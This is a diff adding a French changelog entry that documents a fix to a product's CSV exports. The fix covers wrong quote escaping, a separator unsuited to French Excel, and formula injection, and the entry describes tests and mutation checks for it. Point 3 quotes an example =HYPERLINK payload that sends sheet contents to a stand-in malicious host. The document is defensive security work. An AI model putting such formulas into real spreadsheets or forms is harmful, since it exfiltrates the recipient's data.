@@ -1310,3 +1310,71 @@ sur le même écran.
 le périmètre client, le nom de page en `?? "Page"`. Trois tests tombent.
 
 Suite complète : 5 015 tests, 304 fichiers. Build vert.
+
+---
+
+## v90 — le fichier exporté, ouvert dans le tableur du commerçant
+
+**Le relevé.** Le produit fabrique six CSV — messages, pages, QR codes, quatre
+exports de statistiques, scans d'un QR — et chacun avait sa propre façon
+d'écrire une cellule. Trois faits, mesurés en rejouant les fonctions du dépôt
+sur des données réelles.
+
+**1. L'échappement du guillemet.** `app/dashboard/profile/page.tsx` écrivait :
+
+```js
+const esc = v => `"${String(v ?? "").replace(/"/g, '"\""')}"`
+```
+
+`'"\""'` vaut **trois** guillemets, pas deux. Sur un titre réel — « Menu "midi"
+— 12,90 € » :
+
+```
+leads        : "Menu ""midi"" — 12,90 €"       OK
+profil       : "Menu """midi""" — 12,90 €"     CASSÉ
+               relu selon RFC 4180 → « Menu " » + le reste hors du champ
+statistiques : "Menu ""midi"" — 12,90 €"       OK
+```
+
+Le fichier casse à partir de la première page dont le titre contient un
+guillemet — et le reste de la ligne part dans les mauvaises colonnes.
+
+**2. Le séparateur.** La virgule, sans ligne `sep=`. Excel en français attend le
+séparateur de liste Windows, « ; » : tout le fichier atterrit dans la colonne A.
+C'est le tableur de l'artisan à qui ce produit s'adresse.
+
+**3. Ce que le tableur fait du champ libre.** Le message d'un formulaire est
+écrit par le **public** : n'importe qui scanne le QR et tape ce qu'il veut. Une
+cellule commençant par `=` est évaluée comme formule à l'ouverture — dans les
+trois fabriques :
+
+```
+=HYPERLINK("https://exemple-malveillant.fr/?f="&A1,"Voir la réservation")
+```
+
+Le commerçant ouvre son export et voit un lien qui emporte le contenu de sa
+propre feuille.
+
+**Ce que le lot change.** `lib/exportCsv.ts`, module pur et fabrique unique :
+`celluleCsv` (neutralisation puis guillemets RFC 4180 — doublés), `ligneCsv`,
+`construireCsv` (BOM + `sep=;` + CRLF), `csvDepuisObjets`, `nomDeFichierCsv`
+(daté), `TYPE_CSV`. `estFormuleDeTableur` neutralise `=`, `@`, `+`, `-`, tab et
+CR — **sauf** quand la cellule est un nombre ou un numéro de téléphone :
+« +33 6 12 34 56 78 » reste tel quel, c'est la donnée la plus utile de l'écran
+Messages. Le texte neutralisé reste lisible en entier, précédé d'une apostrophe :
+on désamorce, on ne perd rien.
+
+Les quatre fichiers appelants passent par le module ; aucun ne recolle son BOM,
+son type MIME ou son échappement.
+
+**Garde.** `lib/exportCsv.test.ts` (18 tests) avec un **relecteur RFC 4180**
+écrit dans le test : chaque cas vérifie que ce qui sort se relit à l'identique,
+au lieu de comparer des chaînes à l'œil. Trois balayages d'arbre : tout fichier
+qui fabrique un CSV importe le module, personne ne réécrit l'échappement à la
+main, et le type MIME n'est plus écrit en dur.
+
+**Vérification par mutation.** Quatre défauts réinjectés — le guillemet retriplé,
+la neutralisation retirée, la virgule revenue, et le profil refabriquant son
+échappement. Six tests tombent.
+
+Suite complète : 5 033 tests, 305 fichiers. Build vert.
